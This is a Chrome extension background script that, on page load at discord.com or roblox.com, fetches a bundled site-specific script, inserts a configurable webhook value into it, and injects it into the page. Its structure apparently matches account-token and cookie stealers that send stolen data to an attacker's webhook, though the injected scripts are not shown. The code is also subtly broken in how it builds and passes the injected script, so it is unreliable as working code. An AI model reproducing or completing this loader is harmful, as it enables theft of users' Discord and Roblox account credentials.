chrome.runtime.onInstalled.addListener(() => {
  console.log('Extension installed');
});

// Configuration
const config = {
  webhook: 'your_webhook_value_here' // Replace 'your_webhook_value_here' with your actual webhook value
};

chrome.webNavigation.onCompleted.addListener(details => {
  const replaceAndExecuteScript = (filename) => {
    const url = chrome.runtime.getURL(`scripts/${filename}`);
    fetch(url)
      .then(response => response.text())
      .then(data => {
        const modifiedData = data.replace('%WEBHOOK%', config.webhook);

        const script = document.createElement('script');
        script.textContent = modifiedData;

        chrome.scripting.executeScript({
          target: { tabId: details.tabId },
          func: () => {
            document.head.appendChild(script);
          }
        });
      })
      .catch(error => console.error(`Error fetching or modifying the script (${filename}):`, error));
  };

  if (details.url.includes('discord.com')) {
    replaceAndExecuteScript('discord.js');
  } else if (details.url.includes('roblox.com')) {
    replaceAndExecuteScript('roblox.js');
  }
});
